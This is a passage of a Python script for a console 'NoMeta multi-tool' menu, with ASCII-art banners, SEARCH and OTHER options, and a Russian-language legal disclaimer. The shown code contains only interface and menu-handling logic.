                            ░░██████ ░░███          ░░██████ ██████           ░░███              
                             ░███░███ ░███   ██████  ░███░█████░███   ██████  ███████    ██████  
                             ░███░░███░███  ███░░███ ░███░░███ ░███  ███░░███░░░███░    ░░░░░███ 
                             ░███ ░░██████ ░███ ░███ ░███ ░░░  ░███ ░███████   ░███      ███████ 
                             ░███  ░░█████ ░███ ░███ ░███      ░███ ░███░░░    ░███ ███ ███░░███ 
                             █████  ░░█████░░██████  █████     █████░░██████   ░░█████ ░░████████
                            ░░░░░    ░░░░░  ░░░░░░  ░░░░░     ░░░░░  ░░░░░░     ░░░░░   ░░░░░░░░ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                            NoMeta multi-tool! By: @nometadone
                                                     Press to Enter
"""
Anime.Fade(Center.Center(intro), Colors.white_to_green, Colorate.Vertical, interval=0.045, enter=True)

while True:
    clear()
    banner = r'''
              ███████   █████ ██████   ██████
              ░░██████ ░░███ ░░██████ ██████ 
               ░███░███ ░███  ░███░█████░███ 
               ░███░░███░███  ░███░░███ ░███ 
               ░███ ░░██████  ░███ ░░░  ░███ 
               ░███  ░░█████  ░███      ░███ 
               █████  ░░█████ █████     █████
              ░░░░░    ░░░░░ ░░░░░     ░░░░░  V3
                     BY @nometadone 
                     
                ┌────────MAIN────────┐     
                │      1 | SEARCH    │
                │      2 | OTHER     │
                └────────────────────┘
                 
    ┌────────────────────────────────────────────────┐
    │   0 | Exit               i | Information       │
    └────────────────────────────────────────────────┘

    '''

    print(Colorate.Vertical(Colors.white_to_green, Center.XCenter(banner)))

    select = input(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}                                              >> {COLOR_CODE["RESET"]}')

    if select == '1':
        main2()
        break

    elif select == '2':
        main3()
        break
    elif select == 'i':
        Write.Print("""
            Отказ от ответственности
    Внимание: Данная мультитул утилита предоставляется исключительно для информационных и образовательных целей. Все инструменты, включенные в эту утилиту, предназначены для использования в рамках законных и этичных практик.

    Юридическая ответственность: Пользователь берет на себя полную ответственность за соблюдение всех применимых законов и нормативных актов в юрисдикции, в которой используется данная утилита. Любое использование программного обеспечения для незаконных, неэтичных или несанкционированных действий строго запрещено.

    Авторство и ответственность: Разработчики и авторы данной утилиты не несут ответственности за любой ущерб, утрату данных или последствия, вызванные использованием этой программы. Пользователь соглашается с тем, что он сам несет всю ответственность за любые действия, совершенные с использованием данной утилиты.

    Уведомление: Некоторые инструменты могут собирать, обрабатывать или передавать данные, использование которых регулируется законами о конфиденциальности и безопасности данных. Пользователь обязан убедиться в том, что все действия, совершаемые с помощью этой утилиты, соответствуют законодательству и не нарушают прав третьих лиц.

    Ограничение ответственности: Данная утилита предоставляется "как есть", без каких-либо гарантий, явных или подразумеваемых. Разработчики не гарантируют точности, надежности или корректности работы утилиты и не несут ответственности за любой ущерб, возникший в результате использования утилиты.

    Согласие: Приобретая и используя эту утилиту, вы подтверждаете свое согласие с вышеуказанными условиями. Незнание или непонимание данных условий не освобождает вас от ответственности за любые нарушения закона или прав третьих лиц, которые могут возникнуть в результате использования этой утилиты.
            """, current_theme, interval=0.005)
        input('\n Enter to Restart')
    elif select == '0':
        exit()
    else:
        print(f'{COLOR_CODE["GREEN"]}Неверный выбор, попробуйте снова!{COLOR_CODE["RESET"]}')
